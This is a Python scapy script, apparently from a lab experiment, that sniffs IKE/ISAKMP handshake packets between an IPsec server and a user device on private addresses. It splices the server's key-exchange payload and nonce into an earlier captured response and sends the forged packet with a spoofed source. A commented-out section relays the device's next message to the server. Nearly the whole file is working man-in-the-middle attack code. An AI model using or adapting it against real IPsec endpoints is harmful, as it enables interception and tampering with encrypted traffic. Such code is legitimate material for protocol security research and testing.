#!/usr/local/bin/python
from scapy.all import *
ipsec_server = "192.168.84.128"
ue_addr = "10.0.0.168"
#ue_addr = "10.0.0.30"

##### Phase 2 #####

# capturing response pk from swan server to UE
#packet2=sniff(iface="vmnet8", filter="udp and port 500", count=2, prn=lambda x: x.summary)
packet2=sniff(iface="vmnet8", filter="udp and port 500", count=2)

# storing 2nd response pk from swan ipsec server
data3 = ""
tlayer3 =packet2[1].getlayer(UDP)	
if packet2[1].getlayer(ISAKMP):	
   data3 += str(tlayer3.payload) #assemble the packet

wrpcap("data3.pcap", packet2[1])  # overall packet 

f = open("raw_data3.dat", 'w')
f.write(data3)
f.close()


#Packetizing data3 + data2
#extracting key and nonce from data3
new_key=""
new_nonce=""
pk = rdpcap("data3.pcap")
new_key=pk[0][ISAKMP].payload.payload.load # attribute error
new_nonce=pk[0][ISAKMP].payload.payload.payload.load

#print "new key"
#hexdump(new_key)
#print "new nonce"
#hexdump(new_nonce)

#replace privious response with extracted key and nonce.
pkts = rdpcap("data2.pcap")
pp = ISAKMP(data3)  #payload only
#pp = ISAKMP(pkts[0])  #payload only
pp[0].payload.payload.load = new_key
pp[0].payload.payload.payload.load = new_nonce

#print "pp"
#hexdump(pp[0].payload.payload.load)


#packetizing: original 1st response pkts + new key and nonce

data4 = ""
tlayer =pkts[0].getlayer(UDP)	
if pkts[0].getlayer(ISAKMP):	
   data4 += str(pp[0])

#data2 = ""
#tlayer =pp[0].getlayer("UDP")	
#if pp[0].getlayer(ISAKMP):	
#   data2 += str(tlayer.payload)


#f=open("raw_data2.dat",'r')
#while True:
#  data2 = f.readline()
#  if len(data2)==0:
#    break
 # print data2
  
#f.close()


#wireshark(pkts)
#pkts.key = new_key
#pkts.nonce = new_nonce
#send(IP(dst=10.0.0.30")/UDP()/ISAKMP(pkts))

#send(IP(dst="10.0.0.30")/UDP()/ISAKMP(data3))
send(IP(dst=ue_addr, src=pkts[0][IP].src)/UDP(dport=pkts[0].dport)/ISAKMP(data4))

"""

##### Phase 3 #####


#########################################################
# 3rd message capture, 
packet3=sniff(iface="eth0", filter="udp and port 500", count=2)


# forwarding 3rd request pk from ue to swan server
data4 = ""		
tlayer =packet3[1].getlayer("UDP")	
if packet3[1].getlayer("Raw"):	
   data4 += str(tlayer.payload)
f = open("raw_data3.dat", 'w')
f.write(data4)
f.close()

#send(IP(dst=ipsec_server)/UDP()/ISAKMP(data4))
send(IP(dst=ipsec_server, src=packet3[1][IP].src)/UDP(dport=packet3[1].dport)/ISAKMP(data4))

#"""

